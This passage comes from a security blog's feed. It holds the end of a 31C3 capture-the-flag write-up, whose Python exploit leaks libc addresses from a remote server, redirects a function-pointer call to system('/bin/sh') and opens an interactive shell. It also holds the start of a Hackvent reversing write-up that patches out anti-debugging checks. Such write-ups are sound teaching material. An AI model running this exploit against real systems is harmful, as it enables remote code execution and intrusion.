</span><span class='line'>0x601100 &lt;buf+32&gt;:              0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x601110 &lt;buf+48&gt;:              0x00000000  0x00000000  0x00000000  0x00000000
</span></code></pre></td></tr></table></div></figure>


<p>If we somehow load <code>buf</code> with pointers to code we want to execute, then pass in a large value at the prompt, the code will fetch the parser address from the <code>buf</code> section and we have control over execution:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>r
</span><span class='line'>What <span class="k">do</span> you want to <span class="k">do</span>?
</span><span class='line'>0<span class="o">)</span> parse from hex
</span><span class='line'>1<span class="o">)</span> parse from dec
</span><span class='line'>2<span class="o">)</span> parse from pointer
</span><span class='line'>3<span class="o">)</span> quit
</span><span class='line'>7 <span class="c"># give bigger number!</span>
</span><span class='line'>
</span><span class='line'>Please enter your number: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>RAX: 0x6161616161616161 <span class="o">(</span><span class="s1">&#39;aaaaaaaa&#39;</span><span class="o">)</span>
</span><span class='line'>RBX: 0x0
</span><span class='line'>RCX: 0xfbad2288
</span><span class='line'>RDX: 0x6010e0 <span class="o">(</span><span class="s1">&#39;a&#39;</span> &lt;repeats <span class="m">52</span> <span class="nb">times</span>&gt;, <span class="s2">&quot;\n&quot;</span><span class="o">)</span>
</span><span class='line'>RSI: 0x7ffff7ff7035 --&gt; 0x0
</span><span class='line'>RDI: 0x6010e0 <span class="o">(</span><span class="s1">&#39;a&#39;</span> &lt;repeats <span class="m">52</span> <span class="nb">times</span>&gt;, <span class="s2">&quot;\n&quot;</span><span class="o">)</span>
</span><span class='line'>RBP: 0x7fffffffe4b0 --&gt; 0x0
</span><span class='line'>RSP: 0x7fffffffe4a0 --&gt; 0x7ffffe590
</span><span class='line'>...snip...
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>   0x4008b3 &lt;main+167&gt;: add    rax,0x601080
</span><span class='line'>   0x4008b9 &lt;main+173&gt;: mov    rax,QWORD PTR <span class="o">[</span>rax<span class="o">]</span>
</span><span class='line'>   0x4008bc &lt;main+176&gt;: mov    edi,0x6010e0
</span><span class='line'><span class="o">=</span>&gt; 0x4008c1 &lt;main+181&gt;: call   rax
</span><span class='line'>   0x4008c3 &lt;main+183&gt;: mov    QWORD PTR <span class="o">[</span>rbp-0x8<span class="o">]</span>,rax
</span><span class='line'>   0x4008c7 &lt;main+187&gt;: mov    rax,QWORD PTR <span class="o">[</span>rbp-0x8<span class="o">]</span>
</span><span class='line'>   0x4008cb &lt;main+191&gt;: mov    rsi,rax
</span><span class='line'>   0x4008ce &lt;main+194&gt;: mov    edi,0x400a3d
</span><span class='line'>Guessed arguments:
</span><span class='line'>arg<span class="o">[</span>0<span class="o">]</span>: 0x6010e0 <span class="o">(</span><span class="s1">&#39;a&#39;</span> &lt;repeats <span class="m">52</span> <span class="nb">times</span>&gt;, <span class="s2">&quot;\n&quot;</span><span class="o">)</span>
</span><span class='line'>..snip...
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x00000000004008c1 in main <span class="o">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Excellent. Now what pointer should we store in <code>buf</code>? I couldn&rsquo;t make a ROP chain, for I had no control over the stack. The obvious thing to do was to return to <code>system()</code> with <code>/bin/sh</code> as argument. But where was <code>system()</code> located?</p>

<p>I had no idea what <code>libc</code> version was running. I did have an arbitrary read primitive though. I had downloaded <code>libc-2.19</code> and from the addresses of <code>printf</code> and <code>puts</code> (both available in the GOT) I deduced that this <em>wasn&rsquo;t</em> the correct version. However, I decided to scan the remote binary&rsquo;s libc for signature bytes of <code>system()</code>. I assumed it started with these bytes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/31c3/cfy<span class="nv">$ </span>gdb ./libc-2.19.so
</span><span class='line'>GNU gdb <span class="o">(</span>GDB<span class="o">)</span> 7.4.1-debian
</span><span class='line'>...snip...
</span><span class='line'>gdb-peda<span class="nv">$ </span>x/8b system
</span><span class='line'>0x46530 &lt;system&gt;:   0x48    0x85    0xff    0x74    0xb 0xe9    0x26    0xfb
</span></code></pre></td></tr></table></div></figure>


<p>So I wrote a small scanner in python. This scanner will dump bytes from libc, searching for <code>ff85</code> in the output.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;2</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x601020</span><span class="p">)</span> <span class="c"># printf</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;188.40.18.73&#39;</span><span class="p">,</span> <span class="mi">3313</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1025</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">1.5</span><span class="p">)</span>
</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">PRINTF</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
</span><span class='line'><span class="k">print</span> <span class="n">data</span>
</span><span class='line'><span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;hex: (.*)&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span><span class='line'><span class="k">if</span> <span class="n">m</span><span class="p">:</span>
</span><span class='line'>  <span class="n">PRINTF</span> <span class="o">=</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">OFFSET</span><span class="o">=</span><span class="mi">63580</span>    <span class="c"># guesstimated from real libc</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5000</span><span class="p">):</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;2</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">PRINTF</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="n">OFFSET</span><span class="o">-</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">data</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">i</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="s">&#39;ff85&#39;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span> <span class="c"># part of test rdi, rdi</span>
</span><span class='line'>          <span class="k">print</span> <span class="s">&quot;[!] found possible offset for system(): printf-</span><span class="si">%d</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">PRINTF</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">PRINTF</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="n">OFFSET</span><span class="o">-</span><span class="n">i</span><span class="p">))</span>
</span><span class='line'>          <span class="k">print</span> <span class="s">&quot;[!] system @ </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">PRINTF</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="n">OFFSET</span><span class="o">-</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>          <span class="nb">raw_input</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>It gave a lot of possible addresses, and once I thought I had <code>system()</code> but it was the wrong. I chose a reasonble offset to start from (based on libc 2.19) and ran the script. I stumbled upon the following output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">...</span><span class="n">snip</span><span class="o">...</span>
</span><span class='line'><span class="mi">85</span>
</span><span class='line'><span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">found</span> <span class="n">possible</span> <span class="n">offset</span> <span class="k">for</span> <span class="n">system</span><span class="p">():</span> <span class="n">printf</span><span class="o">-</span><span class="mi">63665</span>
</span><span class='line'><span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">system</span> <span class="err">@</span> <span class="mh">0x7f4df0086b2f</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">Please</span> <span class="n">enter</span> <span class="n">your</span> <span class="n">number</span><span class="p">:</span> <span class="n">dec</span><span class="p">:</span> <span class="mi">2803784840145881088</span>
</span><span class='line'><span class="nb">hex</span><span class="p">:</span> <span class="mh">0x26e90b74ff854800</span>
</span><span class='line'>
</span><span class='line'><span class="n">What</span> <span class="n">do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">do</span><span class="err">?</span>
</span><span class='line'><span class="mi">0</span><span class="p">)</span> <span class="n">parse</span> <span class="kn">from</span> <span class="nn">hex</span>
</span><span class='line'><span class="mi">1</span><span class="p">)</span> <span class="n">parse</span> <span class="kn">from</span> <span class="nn">dec</span>
</span><span class='line'><span class="mi">2</span><span class="p">)</span> <span class="n">parse</span> <span class="kn">from</span> <span class="nn">pointer</span>
</span><span class='line'><span class="mi">3</span><span class="p">)</span> <span class="n">quit</span>
</span><span class='line'>
</span><span class='line'><span class="mi">86</span>
</span><span class='line'><span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">found</span> <span class="n">possible</span> <span class="n">offset</span> <span class="k">for</span> <span class="n">system</span><span class="p">():</span> <span class="n">printf</span><span class="o">-</span><span class="mi">63666</span>
</span><span class='line'><span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">system</span> <span class="err">@</span> <span class="mh">0x7f4df0086b2e</span>
</span></code></pre></td></tr></table></div></figure>


<p>At <code>printf-63665</code>, libc indeed has the first few bytes of <code>system()</code>. It started with a <code>00</code> byte, so I decreased the value by one and plugged that value into a script.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">socket</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># leak printf address in libc via GOT pointer</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;2</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x601020</span><span class="p">)</span> <span class="c"># printf@plt</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;188.40.18.73&#39;</span><span class="p">,</span> <span class="mi">3313</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1025</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">PRINTF</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
</span><span class='line'><span class="k">print</span> <span class="n">data</span>
</span><span class='line'><span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;hex: (.*)&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span><span class='line'><span class="k">if</span> <span class="n">m</span><span class="p">:</span>
</span><span class='line'>  <span class="n">PRINTF</span> <span class="o">=</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] found printf: </span><span class="si">%x</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">PRINTF</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'><span class="n">SYSTEM</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">PRINTF</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">63664</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] system at </span><span class="si">%x</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># spam system into buf</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span>        
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>    <span class="c"># address of system() will be stored in buf</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>    <span class="c"># buf+8</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>    <span class="c"># buf+16</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;7</span><span class="se">\n</span><span class="s">&quot;</span>        <span class="c"># use an address further into buf (parsers+7*16)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;/bin/sh</span><span class="se">\n</span><span class="s">&quot;</span>  <span class="c"># because this will overwrite the first few bytes</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>         <span class="c"># send payload, causing it to call system(&#39;/bin/sh&#39;)</span>
</span><span class='line'>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>  <span class="c"># interact with spawned shell</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>I ran the script and crossed my fingers:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/31c3/cfy<span class="nv">$ </span>python exploit.py
</span><span class='line'>What <span class="k">do</span> you want to <span class="k">do</span>?
</span><span class='line'>0<span class="o">)</span> parse from hex
</span><span class='line'>1<span class="o">)</span> parse from dec
</span><span class='line'>2<span class="o">)</span> parse from pointer
</span><span class='line'>3<span class="o">)</span> quit
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Please enter your number: dec: 140686779126752
</span><span class='line'>hex: 0x7ff4317e93e0
</span><span class='line'>
</span><span class='line'>What <span class="k">do</span> you want to <span class="k">do</span>?
</span><span class='line'>0<span class="o">)</span> parse from hex
</span><span class='line'>1<span class="o">)</span> parse from dec
</span><span class='line'>2<span class="o">)</span> parse from pointer
</span><span class='line'>3<span class="o">)</span> quit
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> found <span class="nb">printf</span>: 7ff4317e93e0
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> system at 7ff4317d9b30
</span><span class='line'>
</span><span class='line'>Please enter your number:
</span><span class='line'>dec: 0
</span><span class='line'>hex: 0x0
</span><span class='line'>
</span><span class='line'>What <span class="k">do</span> you want to <span class="k">do</span>?
</span><span class='line'>0<span class="o">)</span> parse from hex
</span><span class='line'>1<span class="o">)</span> parse from dec
</span><span class='line'>2<span class="o">)</span> parse from pointer
</span><span class='line'>3<span class="o">)</span> quit
</span><span class='line'>
</span><span class='line'>Please enter your number: id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>cfy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>cfy<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>cfy<span class="o">)</span>
</span><span class='line'>cat /home/cfy/flag
</span><span class='line'>THANK YOU WARIO!
</span><span class='line'>
</span><span class='line'>BUT OUR PRINCESS IS IN
</span><span class='line'>ANOTHER CASTLE!
</span><span class='line'>
</span><span class='line'>Login: cfy_pwn // 31C3_G0nna_keep&lt;on&gt;grynding
</span></code></pre></td></tr></table></div></figure>


<p>So the flag was <code>31C3_G0nna_keep&lt;on&gt;grynding</code>. I thought this was quite tough based on the amount of points&hellip;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hackvent 2014 - Reversing Day 23]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/27/hackvent-2014-reversing-day-23/"/>
    <updated>2014-12-27T14:45:39+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/27/hackvent-2014-reversing-day-23</id>
    <content type="html"><![CDATA[<p>Someone passed me a binary and said &lsquo;Here, you&rsquo;ll enjoy this one&rsquo;. I most certainly did&hellip;</p>

<!-- more -->


<p>The guy also gave one hint, which I needed later. I started checking out the binary, which turned out to be a 32-bit Windows PE executable. I downloaded <a href="http://modern.ie">an XP VM</a> and an old, familiar friend: <a href="http://www.ollydbg.de">OllyDbg 1.10</a>, arguably the best debugger for Windows.</p>

<p>Starting up the binary, I was presented with a simple dialog:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-00.png" alt="" /></p>

<p>I tried entering a string to check, but it didn&rsquo;t do anything. I set a few breakpoints, but when I switched back to the dialog, the binary crashed!</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-01.png" alt="" /></p>

<p>What was going on here? <code>IsDebuggerPresent</code> was not referenced in the code, but maybe something else was going on. I set a memory breakpoint on a piece of code where I previously had set a breakpoint and pressed F9.</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-02.png" alt="" /></p>

<p>Then, the binary stopped here:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-03.png" alt="" /></p>

<p>Quite interesting! The binary checks itself for <code>0xCC</code> bytes, aka <code>INT 3</code>. There were two of those checks, one at <code>0x4025e0</code> and one at <code>0x402536</code>. I modified the following <code>JNZ</code> to a <code>JMP</code> so the code would never do anything when it found a breakpoint. Now I could set breakpoints where ever I liked!</p>

<p>Back to the <code>SendDlgItemMessageA</code> calls.</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-04.png" alt="" /></p>

<p>The binary checks the length of our input and if it is exactly <code>0x1D</code> or 29 bytes, it continues by fetching the input. It checks the input for <code>-</code> characters at specific places. From this I deduced that the format of the input should be <code>ABCD-DEFG-HIJK-LMNO-PQRS-TUVW</code>. I entered that and pressed check, ending up here:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-06.png" alt="" /></p>

